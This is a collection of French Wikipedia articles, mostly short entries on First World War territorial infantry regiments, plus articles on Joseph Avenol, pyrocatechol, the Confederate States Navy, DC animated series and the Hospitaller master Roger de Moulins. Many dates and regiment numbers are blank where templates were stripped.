Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Historique des garnisons, combats et batailles du RIT.
Première Guerre mondiale.
1914.
Mobilisé à Dreux ( région militaire). À partir du , il est affecté à la garnison du gouvernement militaire de Paris ().
1915.
De mai à juillet 1915, les trois bataillons formant le régiment quittent Paris. L'état-major régimentaire, resté sur place, devient celui du d'infanterie territoriale. Les bataillons du reçoivent un nouvel état-major le . 
1918.
Le , le régiment est dissous, ses deux bataillons deviennent des bataillons de pionniers indépendants.
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844764" url="https://fr.wikipedia.org/wiki?curid=2844764" title="106e régiment d'infanterie territoriale">
106e régiment d'infanterie territoriale

Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Historique des garnisons, combats et batailles du RIT.
Première Guerre mondiale.
1914.
Il est mobilisé dans la région militaire à Bourgoin-Jallieu.
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844766" url="https://fr.wikipedia.org/wiki?curid=2844766" title="112e régiment d'infanterie territoriale">
112e régiment d'infanterie territoriale

Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Création et différentes dénominations.
Le régiment reçoit son numéro par décret du , en prévision de la mobilisation.
Drapeau.
Il ne porte aucune inscription.
Voir aussi.
Sources et bibliographie.
Historique du Régiment Territorial - librairie Chapelot - Paris

</doc>
<doc id="2844769" url="https://fr.wikipedia.org/wiki?curid=2844769" title="63e régiment d'infanterie territoriale">
63e régiment d'infanterie territoriale

Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Création et différentes dénominations.
Le régiment reçoit son numéro par décret du , en prévision de la mobilisation.
Drapeau.
Il ne porte aucune inscription.
Historique des garnisons, combats et batailles du RIT.
Première Guerre mondiale.
Garnison: Autun (Saône-et-Loire)
Affectations :

</doc>
<doc id="2844770" url="https://fr.wikipedia.org/wiki?curid=2844770" title="35e régiment d'infanterie territoriale">
35e régiment d'infanterie territoriale

Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Création et différentes dénominations.
Le régiment reçoit son numéro par décret du , en prévision de la mobilisation.
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844774" url="https://fr.wikipedia.org/wiki?curid=2844774" title="27e régiment d'infanterie territoriale">
27e régiment d'infanterie territoriale

Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Création et différentes dénominations.
Le régiment reçoit son numéro par décret du , en prévision de la mobilisation.
Historique des garnisons, combats et batailles.
Première Guerre mondiale.
1914.
Le 27e régiment d'infanterie territoriale est formé, le , avec les territoriaux de la subdivision de Mamers dans le département de la Sarthe. Il comprend outre l'état-major du régiment, 3 bataillons (12 compagnies) et 2 sections de mitrailleuses.
Le régiment arrive, par train, le à Massy-Palaiseau d’où il est dirigé, à pied, sur Choisy-le-Roi et affecté à la 168e brigade de la d'Infanterie Territoriale.
Le , il quitte ses cantonnements de Choisy-le-Roi et passant par Vitry et Ivry-sur-Seine il embarque à la gare du Chevaleret et arrive à la gare de Douai le , qu'il quitte immédiatement pour Raches et Roost-Warendin. 
Le , le régiment quitte ses cantonnements et est fractionné en 2 parties :
Le , les bataillons se mettent en état de défense et construisent des retranchements.
Le , le 3e bataillon et l'état-major partent pour Valenciennes en passant par Hordain, Bouchain, Lourches, Rouvignies et La Sentinelle.
Du 22 au (combat du Pavé d'Hordain et combat d'Iwuy), le 1er bataillon et les sections de mitrailleuses alors en défense à Avesnes-le-Sec et Villers-en-Cauchies, combattent au « Pavé d'Hordain » afin d'arrêter le mouvement en avant de l'armée allemande. Le 1er peloton et une section de mitrailleuses sont décimés. Le reste du bataillon est contraint de se replier sur Iwuy. Ils sont attaqués par des automitrailleuses et de l'artillerie, les débris du 1er bataillon parviennent à rejoindre Cambrai, d’où il reçoit l'ordre d'aller occuper Tilloy et les avant-poste derrière le canal de l'Escaut, puis de se mettre en défense.&lt;br&gt;
Le au matin, les Allemands attaquent à partir d'Escaudœuvres et la route de Solesmes et franchissant le canal se portent sur la route d'Arras où il est attaqué violemment, entre Sailly et Raillencourt, par des batteries allemandes établies sur la route de Lille. &lt;br&gt;
Le à 4h30 du matin, après avoir défendu les faubourgs de Cambrai jusque Sainte-Olle, ce qui reste du bataillon, 125 hommes, fait retraite vers Arras, en passant par Bourlon, Moeuvres, Quéant, Riencourt, Hendecourt-lès-Cagnicourt et Vis-en-Artois où il reçoit l'ordre de se replier sur Arras pour y être embarqué. Devant l'impossibilité d'être embarqué, le bataillon se dirige sur Beaumetz-lès-Loges et cantonne dans la soirée à La Herlière.
Le , le bataillon est dirigé sur Doullens, Hem, Gézaincourt, Fienvillers, Candas, Canaples, Vignacourt et arrive à Picquigny à 23 heures.&lt;br&gt;
Le à 6h30, il quitte Picquigny et se dirige par Ailly vers Amiens qu'il atteint à 11 heures au faubourg de Montières.&lt;br&gt;
Le en fin d'après-midi, le bataillon quitte Montières par Saveuse pour Saulchoy-sous-Poix et cantonne à Thieulloy-la-Ville à 23 heures.&lt;br&gt;
Le à 6h30, il quitte Thieulloy-la-Ville et passant par Meigneux, Fourcigny, Escles et Gourchelles, il bivouaque à Saint-Valery et est placé aux avant-postes.
Les et , il quitte Saint-Valery par Haudricourt, Ronchois il prend un cantonnement d'alerte à Conteville.&lt;br&gt;
Le , par Saint-Saire il cantonne à Mauray.&lt;br&gt;
Le , par Osmonville il cantonne à La Rue-Saint-Pierre en soutien d'artillerie.&lt;br&gt;
Le , par Morgny il prend son cantonnement à Saint-Jacques-sur-Darnétal.
Le à 5h45, il passe par Épinay, Franquevillette et arrive à La Neuville-Chant-d'Oisel où il séjourne jusqu'au .
Le , il reçoit un détachement de 749 hommes.
Le , le bataillon quitte Valenciennes et par Anzin, Bruay et Escautpont, 
Le , l'ensemble des compagnies organise ses défenses et creuse les tranchées.&lt;br&gt;
Le , après s'être rassemblé à Saint-Amand-les-Eaux, le bataillon quitte la région de Condé-sur-l'Escaut et passant par Raismes, il arrive à Valenciennes à 3 heures du matin.&lt;br&gt;
Le , le bataillon quitte Valenciennes vers Aulnoy, Famars où il est attaqué par l'artillerie allemande. Il se replie alors vers Haspres puis sur Verchain à l'exception de la compagnie.&lt;br&gt;À Verchain, nouvelle attaque de l'artillerie puis poursuite de la colonne par un détachement de cyclistes. Le bataillon subit de nombreuses pertes. La compagnie est attaquée à Vendegies et perd 130 hommes. Une partie parvient à s'enfuir jusque Orsinval où après s'être dirigé vers Maubeuge, parvient à gagner Dunkerque, en civil, après 10 jours de marche. 83 hommes de la compagnie parviennent à aller de Solesmes au Cateau d'où ils sont embarqués pour Amiens.&lt;br&gt;
La compagnie, qui n'avait pas suivi le bataillon à Verchain, reste à Haspres où elle est violemment attaquée par l'infanterie, l'artillerie et les automitrailleuses. Après la bataille, ce qui reste de la compagnie se dirige sur Solesmes et Le Cateau.
Le , dans la nuit, une partie des et bataillons sont embarqués pour Amiens, où ils restent en garnison jusqu'au . Les et compagnies sont embarquées, dans la matinée, également pour Amiens. Puis elles sont redirigées sur Arras, d’où elles sont refoulées à nouveau sur Amiens d'où elles sont envoyées finalement à Rouen, d’où elles reprennent la route en direction de Mamers où elles arrivent le lendemain matin et y séjournent jusqu'au .
Le à 1 heure du matin, le bataillon, avec l'état-major du régiment et la compagnie hors rang, quitte Estrun et se dirige sur Hordain, Bouchain, Lourches, Rouvignies, La Sentinelle et arrive à Valenciennes et est dirigé immédiatement sur :
Le , les compagnies mettent en état de défense les villages.&lt;br&gt;L'armée anglaise qui occupait Saint-Aybert, Crespin, Quiévrain et Quiévrechain s'étant repliée au Sud la route de Mons les avant-gardes allemandes brûlent la gare de Blanc-Misseron, et occupent Crespin et Quiévrain.&lt;br&gt; 
Le , les compagnies aidées des travailleurs du dépôt du 127e régiment d'infanterie continuent l'exécution des tranchées :
Le , l'ensemble du bataillon, rallié à Saint-Saulve, se replie sur Marly, Aulnoy et Famars ou il est attaqué par un feu violent d'artillerie. Il continue ensuite son replie par Maing, Monchaux, Sommaing, Vendegies et Saint-Martin ou il est de nouveau assailli par l'artillerie ennemie, puis une nouvelle fois à Saint-Hilaire où il perd l'ensemble de ses officiers et 210 hommes. Le reste du bataillon se replie sur Capelle, Vertain, Solesmes et Le Cateau où il est embarqué pour Amiens.&lt;br&gt;
Le , le bataillon est dirigé sur Rouen puis sur Mamers où il arrive le et y séjourne jusqu'au , date à laquelle il est envoyé à Nogent-le-Rotrou jusqu'au .
Le , le régiment d'infanterie territoriale réuni à La Neuville-Chant-d'Oisel, mais réduit à 2 bataillons, quitte le campement et se rend par Radepont et Grainville à Villerest et Écouis.&lt;br&gt;
Le , par Mesnil-Verclives et Puchay il cantonne à Mainneville.&lt;br&gt;
Le , par Amécourt, Talmontiers, Lalande-en-Son, Le Coudray-Saint-Germer et Saint-Aubin-en-Bray, il s'arrête à Hodenc-en-Bray ( bataillon) et Lachapelle-aux-Pots ( bataillon).&lt;br&gt;
Les 14, 15, 16, 17 et , remontant vers le Nord, dans le cadre de la Course à la mer, le bataillon fait étape à Bonnières, Milly-sur-Thérain, Sauqueuse-Saint-Lucien, Guehengnies, Juvignies, Auchy, Francastel, Le Crocq, Blancfossé, Bonneuil-les-Eaux, L'Hortoy, Epagny, Flers-sur-Noye, Oresmaux, Grattepanche, Sains-en-Amiénois, Saint-Fuscien, Longueau, Glisy et arrive à Amiens où il cantonne jusqu'au , tout en étant chargé de la garde de la Gare et des divers ponts et autres points stratégiques de la ville.&lt;br&gt;
Le , il est formé à la citadelle un dépôt d'éclopés et d'isolés ainsi que la constitution d'un 3e bataillon.&lt;br&gt;
Le 23 et , le bataillon et l'état-major du régiment quittent Amiens et en passant par Allonville, Montigny-sur-l'Hallue, Béhencourt, Lahoussoye, Franvillers, Baizieux, Warloy-Baillon, Hédauville.&lt;br&gt;
Le , la lutte s'étendant sur le front Nesles, Chaulnes, Lihons, ordre est donné aux groupes des divisions territoriales de monter à l'ennemi en se portant sur la ligne Bapaume-Arras. Le bataillon passant par Bertrancourt, Courcelles-au-Bois, Sailly-au-Bois, Hébuterne, Bucquoy, Ablainzevelle est placé en réserve à Beaulencourt, Villers-au-Flos et sur la « cote 128 » où il organise la défense par des tranchées. &lt;br&gt;
Le , durant le combat de Miraumont (Ferme de Beauregard) puis le combat de Villers-au-Flos, un feu violent d'artillerie balaie les positions toute la journée. Le bataillon reçoit l'ordre de la d'Infanterie Territoriale de se rassembler à Hébuterne en passant par Puisieux côté le moins dangereux.&lt;br&gt;
Le 27, , la brigade reçoit l'ordre de se replier derrière l'Ancre par Bapaume, Grévillers, Irles et Miraumont où elle se met en défense. Un 3e bataillon constitué à Amiens rejoint le 2e bataillon sur les positions défensives&lt;br&gt;
Le , la brigade et les 2 bataillons se portent par Foncquevillers, Hannescamps et Ransart et Wailly-lès-Arras et mis à disposition du général Conneau, qui les envoie à Agny et Beaurains où ils s'installent en cantonnement d'alerte.
Le , la brigade est chargée d'occuper les positions à Mercatel, Boisleux-au-Mont, Boisleux-Saint-Marc, Boiry-Becquerelle et Henin-sur-Cojeul et d'organiser ses moyens de défenses de façon à pouvoir résister à toutes attaques. 
Le , la brigade quitte ses positions et est chargée d'organiser les défenses sur la route de Cambrai entre Arras et Tilloy-lès-Mofflaines. Les 2 bataillons du 27 RIT prennent alors la direction de Beauraing et Tilloy-lès-Mofflaines puis un ordre, lui demandant d'établir une ligne de défense entre le canal de la Scarpe, au pont de chemin de fer, la Maison-Blanche et Roclincourt
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844775" url="https://fr.wikipedia.org/wiki?curid=2844775" title="Joseph Avenol">
Joseph Avenol

Joseph Louis Anne Avenol, né le à Melle (Deux-Sèvres, France) et mort le à Duillier (canton de Vaud, Suisse), est un haut fonctionnaire français, diplomate, secrétaire général de la Société des Nations du au .
Biographie.
Inspecteur des finances, haut fonctionnaire au ministère des finances du gouvernement français, il participe à de nombreuses conférences économiques et financières de l'après-guerre. Il est donc envoyé par le gouvernement français à la Société des Nations en 1923 en tant que sous-secrétaire de la SDN chargé des finances. 
À la suite d'un accord officieux entre grandes puissances lors de la négociation du traité de Versailles, le premier secrétaire général devait être britannique, le deuxième français. Il est donc nommé secrétaire général pour succéder au Britannique Eric Drummond, comte de Perth.
Sa nomination a lieu lors d’une période trouble puisque le Japon vient de quitter la SDN le , et l'Allemagne le suit le . À partir de ce moment, Avenol, loin d'une politique de fermeté, joue constamment l'apaisement envers les puissances de l'Axe. Il s'aligne donc sur la politique extérieure de la France et du Royaume-Uni. Pendant l'invasion de l'Éthiopie par l'Italie, il laisse tomber l'Éthiopie dans l'espoir vain que l'Italie reste dans la SDN.
En 1939, il participe au changement institutionnel de la SDN, notamment au travers de la réforme Bruce. On lui a prêté des opinions pro-fascistes, , il soutient néanmoins le régime de Vichy et le maréchal Pétain.
À partir de 1940, il mène une réorganisation des services, qui conduit à une réduction drastique des effectifs et à l'éviction des fonctionnaires britanniques. Il est remplacé au secrétariat général le par l'Irlandais Seán Lester. À cette date, la SDN compte 100 employés, même en incluant la sécurité et le service de nettoyage, contre 700 à l'origine. Il rentre alors en France et propose ses services au gouvernement de Vichy, qui les refuse.
Il retourne en Suisse à la fin de l'année 1943 pour ne pas être arrêté par les Allemands. Il meurt dans ce pays en 1952. Il n'aura jamais été inquiété après-guerre.
Son mandat comme secrétariat général est très critiqué, même par ses contemporains, comme son collaborateur grec, Thanassis Aghnides, par certains historiens (James Barros, "Betrayal from Within", 1969). Quels que soient ses défauts, . N'oublions pas que la SDN est une organisation internationale n'ayant aucune vraie autonomie, ce sont les pays membres qui dictent la politique suivie. Or les différences d'appréciation de la situation entre ces derniers et leurs reculs successifs face aux puissances réactionnaires, .

</doc>
<doc id="2844776" url="https://fr.wikipedia.org/wiki?curid=2844776" title="117e régiment d'infanterie territoriale">
117e régiment d'infanterie territoriale

Le d'infanterie territoriale () est un régiment d'infanterie de l'Armée de terre française ayant participé à la Première Guerre mondiale.
Création et différentes dénominations.
Le régiment reçoit son numéro par décret du , en prévision de la mobilisation.
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844779" url="https://fr.wikipedia.org/wiki?curid=2844779" title="74e régiment d'infanterie territoriale">
74e régiment d'infanterie territoriale

Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Création et différentes dénominations.
Le régiment reçoit son numéro par décret du , en prévision de la mobilisation.
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844780" url="https://fr.wikipedia.org/wiki?curid=2844780" title="Pyrocatéchol">
Pyrocatéchol

Le pyrocatéchol est le benzène-1,2-diol (en nomenclature IUPAC), connu aussi sous le nom de catéchol (avec risque de confusion avec la catéchine). C'est l'isomère "ortho" du benzènediol, portant deux fonctions hydroxyles OH (un diphénol) de formule brute utilisé dans de nombreuses synthèses organiques. Le pyrocatéchol a été isolé pour la première fois avec la catéchine en 1839 par le chimiste Allemand H. Reinsch en distillant de la sève d'acacia à cachou ("Acacia catechu"). Certaines catécholamines ont des fonctions physiologiques importantes.
Origine.
Les catéchols sont des motifs que l'on retrouve dans certaines molécules naturelles synthétisées par les organismes vivants. Par exemple, certaines protéines aux propriétés adhésives présentes dans les moules marines sont très riches en motifs catéchols et leur permet d'adhérer sur un grand nombre de supports.
Lien externe.
Fiches Internationales de Sécurité Chimique CATECHOL ICSC: 0411

</doc>
<doc id="2844781" url="https://fr.wikipedia.org/wiki?curid=2844781" title="Larzac (homonymie)">
Larzac (homonymie)



</doc>
<doc id="2844784" url="https://fr.wikipedia.org/wiki?curid=2844784" title="132e régiment d'infanterie territoriale">
132e régiment d'infanterie territoriale

Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Création et différentes dénominations.
Le régiment reçoit son numéro par décret du . Il doit être formé à Marmande en cas de mobilisation.
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844785" url="https://fr.wikipedia.org/wiki?curid=2844785" title="Confederate States Navy">
Confederate States Navy

La Confederate States Navy (CSN) était la branche navale des forces armées des États confédérés d'Amérique, créée par une loi du Congrès des États confédérés le .
Missions.
Elle était chargée des opérations navales confédérées pendant la guerre de Sécession. ses deux principales tâches pendant cette guerre furent d'assurer la protection des ports et des côtes sudistes d'une invasion nordiste et rendre le coût de la guerre le plus élevé possible pour le Nord en attaquant ses navires marchands et en brisant le blocus de l’"Union Navy".
Historique.
Au début de la guerre, les États du Sud peuvent compter sur un tiers des officiers américains, qui quittent l’"US Navy" pour rejoindre celle des États du Sud mais seulement 4 % du tonnage de la flotte militaire et 10 % de celle de la marine marchande passe sous le pavillon des États confédérés d'Amérique.
La marine confédérée ne put jamais atteindre la puissance de la marine de l'Union mais utilisa des innovations technologiques tels que les cuirassés à coque en fer dont le CSS "Virginia", les sous-marins (dont le CSS "H. L. Hunley") , les bateaux torpilles ou les mines marines ( de l'Union gravement endommagés ou coulés par des mines confédérées qui coulent également confédérés) pour obtenir un avantage sur l’"Union Navy". En , la marine confédérée totalisait une trentaine de navires, contre quatre-vingt-dix pour l’"Union Navy", mais seulement quatorze étaient en état de combattre à la mer. À mesure que la guerre progressait, la marine confédérée grossit, avec une augmentation du nombre de batailles navales et de la menace maritime du Nord. La flotte confédérée compta ainsi jusqu'à de guerre.
À partir de 1861, le président de la Confédération, Jefferson Davis accorda des lettres de marque à des corsaires pour attaquer des bateaux de l'Union et de leurs citoyens.

</doc>
<doc id="2844786" url="https://fr.wikipedia.org/wiki?curid=2844786" title="Marine des États confédérés">
Marine des États confédérés



</doc>
<doc id="2844787" url="https://fr.wikipedia.org/wiki?curid=2844787" title="145e régiment d'infanterie territoriale">
145e régiment d'infanterie territoriale

Le d'infanterie territoriale est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844789" url="https://fr.wikipedia.org/wiki?curid=2844789" title="La Légende des super-héros">
La Légende des super-héros

La Légende des super-héros ("") est une série télévisée d'animation américaine en 26 épisodes de 22 minutes, créée d'après les personnages de la série de "comics" "La Légion des super-héros" (DC Comics) et diffusée entre le et le dans le bloc de programmation Kids' WB sur The CW.
En France, la série a été diffusée à partir du sur France 3, puis rediffusée sur Boing et Toonami. Au Québec, elle a été diffusée sur Vrak.
Synopsis.
Clark Kent est téléporté au et rencontre une nouvelle équipe de justiciers chargés de faire régner l'ordre : l'« Alliance des Super-héros ». L'Alliance et Brainiac 5 décident de ne pas lui raconter son futur, craignant d'altérer le futur de Superman lorsqu'il retournera à son époque, le .

</doc>
<doc id="2844791" url="https://fr.wikipedia.org/wiki?curid=2844791" title="54e régiment d'infanterie territoriale">
54e régiment d'infanterie territoriale

Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Création et différentes dénominations.
Le régiment reçoit son numéro par décret du , en prévision de la mobilisation.
Historique des garnisons, combats et batailles du RIT.
Première Guerre mondiale.
1918.
Intègre la 17ème DI d'Août 1918 à Novembre 1918
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844792" url="https://fr.wikipedia.org/wiki?curid=2844792" title="103e régiment d'infanterie territoriale">
103e régiment d'infanterie territoriale

Le d'infanterie territoriale est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Historique des garnisons, combats et batailles.
Première Guerre mondiale.
1914.
Au déclenchement de la guerre, le régiment est composé de deux bataillons comprenant au total 2614 hommes et 30 officiers.
Drapeau.
Il ne porte aucune inscription.

</doc>
<doc id="2844795" url="https://fr.wikipedia.org/wiki?curid=2844795" title="Batman (série télévisée d'animation, 2004)">
Batman (série télévisée d'animation, 2004)

Batman () est une série télévisée d'animation américaine créée par Duane Capizzi et Michael Goguen, diffusée entre le et le dans le bloc de programmation Kids' WB.
Synopsis.
Depuis trois ans, les criminels de Gotham City sont confrontés à un mystérieux justicier masqué connu sous le nom de « Batman ». Ce personnage est le grand rêve des honnêtes citoyens, et le pire cauchemar des malfaiteurs.
Épisodes.
La série est d'abord diffusée aux États-Unis entre le et le dans le bloc de programmation Kids' WB. En France, elle est diffusée à partir de sur France 3, puis sur France 4.
Production.
La série se consacre aux jeunes années du défenseur de Gotham et aux premières rencontres qu'il fera avec ses ennemis qui deviendront mythiques comme le Joker, Mr Freeze, le Pingouin, Catwoman la présence d'ennemis peu développés auparavant, tels Firefly et Hugo Strange, tandis que les membres principaux de la police sont Ellen Yin et Ethan Bennett jusqu'à l'arrivée de James Gordon à la fin de la saison 2.
Outre l'ambiance et l'apparence des protagonistes totalement nouvelles, cette série ne se veut en aucun cas en relation avec les séries animées précédentes. De plus, alors que les séries animées des années 1990 ("Batman" de 1992 et "Batman" de 1997) possédaient plusieurs niveaux de lecture les destinant à la fois à un public jeune et adulte, cette nouvelle série cible presque essentiellement le jeune public (bien que le langage de la série soit assez sophistiqué par moments).
Contrairement à la version originale, les acteurs prêtant leur voix aux personnages dans la version française étaient pour la plupart déjà présents pour la série animée de 1992 et celle de 1997 ; il est cependant à noter que Bruce Wayne/Batman n'est plus ici doublé par Richard Darbois mais par Adrien Antoine, par ailleurs, il s’agit de la dernière série animée sur Batman dans laquelle le Joker est doublé par Pierre Hatet, le personnage est repris par la suite, dans les autres séries animées, par Xavier Fagnon, puis par Stéphane Ronchewski. Notons également que certains personnages tels que Gueule d'argile et Pyrovol ont gardé leur nom anglais dans la version française pour s'appeler respectivement « Clayface » et « Firefly », alors que leur nom français était utilisé dans la série animée de 1997.
Produits dérivés.
Bandes dessinées.
Une série de comics dérivée de la série, intitulée "The Batman Strikes!", a été éditée par DC Comics. La collection compte 50 numéros, publiés entre et .
En France, environ la moitié de la série a été publiée dans le "Batman Mag". Trois recueils ont également été publiés par les éditions Panini dans la collection Panini Kids.
DVD.
Aux États-Unis, l'intégrale de la série est disponible au travers d'un coffret par saison (soit cinq coffrets). Seules trois saisons comportent une piste audio française.
En France, l'intégrale de la série est sortie en Blu-ray le .

</doc>
<doc id="2844801" url="https://fr.wikipedia.org/wiki?curid=2844801" title="Personnalités liées à Nice">
Personnalités liées à Nice

Justes parmi les nations.
Les 67 Justes parmi les nations de Nice.

</doc>
<doc id="2844804" url="https://fr.wikipedia.org/wiki?curid=2844804" title="Rosso Kumamoto">
Rosso Kumamoto



</doc>
<doc id="2844808" url="https://fr.wikipedia.org/wiki?curid=2844808" title="McQueen">
McQueen



</doc>
<doc id="2844812" url="https://fr.wikipedia.org/wiki?curid=2844812" title="Terence McQueen">
Terence McQueen



</doc>
<doc id="2844814" url="https://fr.wikipedia.org/wiki?curid=2844814" title="Bugsy">
Bugsy



</doc>
<doc id="2844816" url="https://fr.wikipedia.org/wiki?curid=2844816" title="Roger de Moulins">
Roger de Moulins

Roger de Moulins ou Roger de Molins ou Molen est le supérieur de L'Hospital de l'ordre de Saint-Jean de Jérusalem (appelé aussi ordre des Hospitaliers) entre janvier et à sa mort en 1187, il succéda à Joubert de Syrie.
Biographie.
Il était absolument inconnu avant son élévation à la suprême magistrature de l'Ordre. P. A. Paoli en fait un chevalier normand originaire de Moulins mais sans apporter de preuves qui tiennent.
Ses premiers soins, après son installation en Terre sainte, furent d'exhorter le régent et les principaux seigneurs du royaume à continuer avec vigueur la guerre contre Saladin. Le , il participe à la bataille de Montgisard au côté de Baudouin IV, roi de Jérusalem, où ils remportèrent « la plus belle victoire des croisades » face à Saladin.
La jalousie et la concurrence entre les grands pour le gouvernement de l'État, pendant l'infirmité du roi, les intelligences criminelles de quelques seigneurs avec les infidèles ; tout cela ne contribua pas moins aux conquêtes de Saladin, que sa propre valeur et le courage de ses soldats. Comme les querelles qui opposent Bohémond III, prince d'Antioche, au patriarche Aimery de Limoges ou Guy de Lusignan à Raymond III, le comte de Tripoli.
Les Hospitaliers formaient un des éléments militaires les plus solides, mais cela était contraire à l'esprit de l'Ordre les éloignant des œuvres d'hospitalités pour lesquelles ils avaient été créés. Le pape les rappellera à l'observance de la règle de Raymond du Puy entre 1178 et 1180. Une bulle d'Alexandre III leur défend de prendre les armes à moins qu'ils soient attaqués et les engage à ne pas délaisser le soin des pauvres malades.
L'entente avec les Templiers n'était pas au beau fixe. Ils étaient en conflits permanents au sujet de leurs droits et de leurs possessions. Le pape Alexandre III persuada Roger de Moulins de faire une trêve en 1179 avec le maître des Templiers, Eudes de Saint-Amand. Le pape institua un arbitrage : trois frères de chaque ordre sont choisis comme arbitres, ils avaient le droit de s'adjoindre chacun deux autres frères. Si l'arbitrage était insuffisant les frères devaient faire appel à des personnes étrangères aux ordres. S'il y avait toujours persistance d'un désaccord, l'affaire sera soumise en dernier ressort aux deux supérieurs.
Sur un point au moins, les Templiers et les Hospitaliers s'entendent parfaitement : les griefs que l'autorité diocésaine nourrissait contre les privilèges des ordres. Le clergé séculier n'acceptait pas les immunités et privilèges que les deux ordres tenaient du Saint-Siège. Les prélats saisissent, en , le concile de Latran qui réforme les abus et défend aux ordres de recevoir de la part des laïques des églises et des dîmes sans accord de l'autorité diocésaine et annule les dons récents "moderno tempore". Cette décision, en réformant les abus, laissait intacts les privilèges des ordres. Vexé, le clergé redouble d'attaques et il fallut deux bulles, et , pour ramener le clergé dans le respect des décisions du concile, ainsi que celui des personnes et des biens des Hospitaliers et prescrivant l’excommunication de quiconque attaquerait à main armée les Hospitaliers et les Templiers.
En 1184, il visita l'Europe avec Arnaud de Toroge, grand maître des Templiers et Héraclius, patriarche latin de Jérusalem afin de plaider, auprès des rois et du pape Lucius III, l'envoi d'une nouvelle croisade pour renforcer les États latins d'Orient qui sont à la merci de la puissance grandissante de Saladin, l'unificateur du monde musulman. Au cours de ce voyage, il établit l'ordre des Hospitaliers en Angleterre, en France et en Allemagne. Et durant son retour de voyage en 1185, il aida le royaume de Sicile à attaquer la Thessalonique. En son temps, le grand maître des Hospitaliers devint plus impliqué dans la politique du royaume de Jérusalem.
Au décès de jeune roi Baudouin V à Acre, survenu peu après celui de Baudouin IV en 1185, Roger de Moulins s'opposa à Renaud de Châtillon et Guy de Lusignan et refusa d'ailleurs de rendre sa clé à la trésorerie royale contenant les insignes royaux quand Guy de Lusignan fut couronné roi de Jérusalem en 1186.
La bataille de la Fontaine du Cresson.
À la fin de 1186, Renaud de Châtillon , au mépris de la trêve avec Saladin, avait capturé une caravane qui allait du Caire à Damas avec la sœur de l'émir. Les barons, rassemblés à Jérusalem par Guy de Lusignan, le , avaient exigé qu'avant toute chose une réconciliation intervienne entre Lusignan et Raymond III de Tripoli. Les supérieurs des Templiers et des Hospitaliers, Josse, archevêque de Tyr, Balian d'Ibelin, seigneur de Naplouse, et Renaud Granier, seigneur de Sidon, furent désignés pour négocier avec le comte de Tripoli à Tibériade quand ils durent faire face à des troupes musulmanes. Victime de l'orgueil insensé de Gérard de Ridefort, maître des Templiers, Roger de Moulins prit part à la bataille de La Fontaine du Cresson contre Saladin près de Nazareth, le , où il fut tué par une blessure de lance. Le sénéchal Urs d'Alneto, le maréchal Robert Fraisnel ou encore Jacques de Mailly et sont tués à leurs côtés, Gérard de Ridefort avec deux chevaliers templiers et cinq frères de l’Hôpital échappèrent à la mort.
Guillaume Borrel, grand commandeur de l'Ordre depuis le , assure l'intérim, il nomme alors le prieur de Saint-Gilles, Hermangard d'Asp, grand précepteur. Il meurt à son tour lors de la bataille de Hattin. Garnier de Naplouse, fidèle serviteur et ami de Roger de Moulins fut pressenti pour être son héritier en 1187 et, en raison des responsabilités dans l'Ordre, c'est Hermangard d'Asp qui sera élu en 1188. Garnier de Naplouse sera finalement élu en 1190.
Les statuts de l'Ordre.
Le , les nouveaux statuts de l'ordre des Hospitaliers sous la maîtrise de Roger des Moulins marquent sur plusieurs points un tournant essentiel pour l'ordre.
Si, dans le domaine spirituel, dès le , une catégorie de frères prêtres ou chapelains est établie, accordée par le pape Anastase IV ; pour le domaine hospitalier et militaire, il faut attendre ces statuts pour voir apparaître dans le personnel soignant de l'Ordre, des médecins et des chirurgiens et dans le champ militaire, des frères d'armes (notés pour la première fois dans un texte, même s'ils existaient déjà dans les faits) : « C'est à cette date donc que l'ordre est devenu, en droit, un ordre religieux-militaire. »
Précision est faite qu'à la mort d'un frère, une messe y sera dédiée en plus de la messe quotidienne et que « les biers des frères, et soient couvert d'un drap rouge au croiz blanche ».
Ce sont les seuls statuts à mentionner la charité dans un texte normatif. Trois articles en font référence, tous portés sur l'accueil et le soin des malades :
De Moulins est à l'origine de la bulle fulminée le , "Quanto per gratiam Dei", c'est celle-ci qui fit officiellement l'Ordre comme un ordre caritatif. Ce sont ceux qui donnent le plus de renseignements sur les soins. Que ce soit sur le recrutement à temps complet (à l'hôpital ou au champ de bataille) et liés par serment des quatre médecins et des quatre chirurgiens employés par l'Ordre, « à cause de la carence scientifique et pratique des frères ». Que sur les prescriptions sur la nutrition (de la viande à la boisson tout en rappelant les aliments déconseillés) qui repose sur deux principes, à savoir : « une très grande variété d'aliments [...] l'alternance ».
Seuls textes normatifs (en excluant le témoignage de l'anonyme de Munich), qui rendent compte de l'accueil de toutes femmes enceintes dans une salle spécifique, et de l'avenir des enfants abandonnés, que l'hôpital doit alors « ressevoir et faire nourrir ».

</doc>
